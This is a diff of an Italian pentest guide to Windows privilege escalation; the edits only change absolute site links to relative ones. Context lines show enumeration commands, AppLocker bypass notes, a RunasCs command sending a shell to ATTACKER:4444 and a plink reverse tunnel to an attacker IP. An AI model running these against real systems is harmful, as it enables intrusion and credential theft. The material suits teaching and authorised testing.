@@ -25,7 +25,7 @@ La privilege escalation locale su Windows sfrutta misconfigurazioni di servizi, 
 
 ***
 
-Su qualsiasi macchina Windows compromessa, il primo obiettivo dopo l'accesso è diventare SYSTEM o local Administrator. Non perché sia sempre necessario per l'obiettivo dell'engagement, ma perché solo con quel livello di accesso puoi estrarre credenziali da LSASS (vedi [Mimikatz](https://hackita.it/articoli/mimikatz/)), installare software e avere controllo completo della macchina per il pivot successivo.
+Su qualsiasi macchina Windows compromessa, il primo obiettivo dopo l'accesso è diventare SYSTEM o local Administrator. Non perché sia sempre necessario per l'obiettivo dell'engagement, ma perché solo con quel livello di accesso puoi estrarre credenziali da LSASS (vedi [Mimikatz](/articoli/mimikatz/)), installare software e avere controllo completo della macchina per il pivot successivo.
 
 **Administrator vs SYSTEM:** Administrator è un account con privilegi elevati ma comunque soggetto ad alcune restrizioni (UAC, alcuni processi protetti); SYSTEM è l'account con cui gira il kernel stesso e ha accesso pieno, incluso l'accesso diretto a LSASS senza restrizioni aggiuntive.
 
@@ -87,7 +87,7 @@ Invoke-AllChecks
 .\Seatbelt.exe -group=all
 ```
 
-Vedi: [WinPEAS](https://hackita.it/articoli/winpeas/), [Seatbelt](https://hackita.it/articoli/seatbelt/), [SharpUp](https://hackita.it/articoli/sharpup/).
+Vedi: [WinPEAS](/articoli/winpeas/), [Seatbelt](/articoli/seatbelt/), [SharpUp](/articoli/sharpup/).
 
 ***
 
@@ -169,7 +169,7 @@ Altri bypass concettuali documentati per AppLocker, da verificare caso per caso 
 
 * **Regole path-based troppo permissive** — una regola come `%OSDRIVE%*\allowed*` permette di creare una cartella chiamata `allowed` ovunque sul disco e farla considerare fidata
 * **Binari PowerShell alternativi** — molte policy bloccano solo `%System32%\WindowsPowerShell\v1.0\powershell.exe`, dimenticando `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`
-* **LOLBins** — binari legittimi già firmati e whitelistati (vedi [LOLBins](https://hackita.it/articoli/lolbins/)) spesso permettono comunque esecuzione di codice arbitrario nel loro contesto
+* **LOLBins** — binari legittimi già firmati e whitelistati (vedi [LOLBins](/articoli/lolbins/)) spesso permettono comunque esecuzione di codice arbitrario nel loro contesto
 * **DLL enforcement** — raramente abilitato per il carico prestazionale che comporta, quindi una DLL malevola può spesso girare anche dove gli eseguibili sono bloccati
 
 ### WDAC (Windows Defender Application Control)
@@ -200,7 +200,7 @@ In CLM, molti tool offensivi basati su PowerShell (PowerUp, Invoke-Mimikatz, ecc
 netsh advfirewall show allprofiles state
 ```
 
-Controlla lo stato per ciascun profilo (Domain, Private, Public) — utile per capire se, dopo l'escalation, sarà possibile aprire connessioni in uscita per un reverse shell o se serviranno tecniche di [pivoting](https://hackita.it/articoli/socat/) alternative.
+Controlla lo stato per ciascun profilo (Domain, Private, Public) — utile per capire se, dopo l'escalation, sarà possibile aprire connessioni in uscita per un reverse shell o se serviranno tecniche di [pivoting](/articoli/socat/) alternative.
 
 ```powershell
 # Regole di blocco effettive attualmente applicate
@@ -272,7 +272,7 @@ systeminfo | findstr /i "os name os version build"
 python3 wes.py systeminfo.txt --exploits-only -i "Elevation of Privilege"
 ```
 
-Vedi: [WES-NG](https://hackita.it/articoli/wes-ng/).
+Vedi: [WES-NG](/articoli/wes-ng/).
 
 Piuttosto che affidarsi a una lista statica di CVE (che invecchia rapidamente), verifica sempre le KB installate rispetto al catalogo [MSRC](https://msrc.microsoft.com/update-guide) e al [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) per le vulnerabilità note sfruttate attivamente al momento del test. I kernel exploit restano l'ultima risorsa: sono spesso instabili e possono causare crash (BSOD) sulla macchina target.
 
@@ -454,13 +454,13 @@ Get-ModifiableScheduledTaskFile | Select-Object TaskName, TaskFilePath
 Get-ModifiableRegistryAutoRun | Select-Object Path, ModifiablePath
 ```
 
-Vedi articolo dedicato: [Scheduled Task](https://hackita.it/articoli/scheduled-task/).
+Vedi articolo dedicato: [Scheduled Task](/articoli/scheduled-task/).
 
 ***
 
 ## Enumerazione in Tempo Reale — l'Equivalente di pspy su Windows
 
-Su Linux, [pspy](https://hackita.it/articoli/pspy/) permette di osservare processi lanciati da altri utenti senza privilegi elevati — utile soprattutto per intercettare scheduled task o script eseguiti periodicamente da un account privilegiato. Su Windows non esiste un tool identico, ma lo stesso principio si ottiene con un polling loop in PowerShell o CMD.
+Su Linux, [pspy](/articoli/pspy/) permette di osservare processi lanciati da altri utenti senza privilegi elevati — utile soprattutto per intercettare scheduled task o script eseguiti periodicamente da un account privilegiato. Su Windows non esiste un tool identico, ma lo stesso principio si ottiene con un polling loop in PowerShell o CMD.
 
 ```powershell
 # Mostra i nuovi processi non appena compaiono
@@ -535,7 +535,7 @@ Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" |
 .\RunasCs.exe utente password "cmd /c whoami" -r ATTACKER:4444
 ```
 
-Vedi anche [Credential Dumping](https://hackita.it/articoli/credential-dumping/), [Mimikatz](https://hackita.it/articoli/mimikatz/), [LaZagne](https://hackita.it/articoli/lazagne/).
+Vedi anche [Credential Dumping](/articoli/credential-dumping/), [Mimikatz](/articoli/mimikatz/), [LaZagne](/articoli/lazagne/).
 
 ### Group Policy Preferences (GPP) — cpassword
 
@@ -674,7 +674,7 @@ type (Get-PSReadlineOption).HistorySavePath
 
 ### Enumerazione del Contesto di Dominio
 
-Quando la macchina fa parte di un dominio, prima di procedere con la privilege escalation locale conviene raccogliere anche il contesto AD circostante — utile per capire se conviene puntare a un percorso di escalation locale o se è più efficiente muoversi verso l'enumerazione del dominio (vedi [Active Directory](https://hackita.it/articoli/active-directory/)):
+Quando la macchina fa parte di un dominio, prima di procedere con la privilege escalation locale conviene raccogliere anche il contesto AD circostante — utile per capire se conviene puntare a un percorso di escalation locale o se è più efficiente muoversi verso l'enumerazione del dominio (vedi [Active Directory](/articoli/active-directory/)):
 
 ```cmd
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -714,7 +714,7 @@ Get-EventLog -LogName "Security" -Newest 1000 | Export-Csv C:\temp\sec_log.csv -
 
 ### Copie Offline del SAM
 
-Oltre al backup esplicito con `reg save` già descritto in [Credential Dumping](https://hackita.it/articoli/credential-dumping/), su alcune build possono restare copie residue del SAM in percorsi legacy, utili se accessibili in lettura:
+Oltre al backup esplicito con `reg save` già descritto in [Credential Dumping](/articoli/credential-dumping/), su alcune build possono restare copie residue del SAM in percorsi legacy, utili se accessibili in lettura:
 
 ```
 %SYSTEMROOT%\repair\SAM
@@ -752,7 +752,7 @@ netstat -ano
 plink.exe -R <porta_remota_su_attaccante>:127.0.0.1:<porta_locale_servizio> root@<IP_ATTACCANTE>
 ```
 
-Vedi anche l'approccio più moderno con [Chisel](https://hackita.it/articoli/chisel/) o [proxychains](https://hackita.it/articoli/proxychains/) per lo stesso obiettivo.
+Vedi anche l'approccio più moderno con [Chisel](/articoli/chisel/) o [proxychains](/articoli/proxychains/) per lo stesso obiettivo.
 
 ### Nota su AMSI Bypass
 
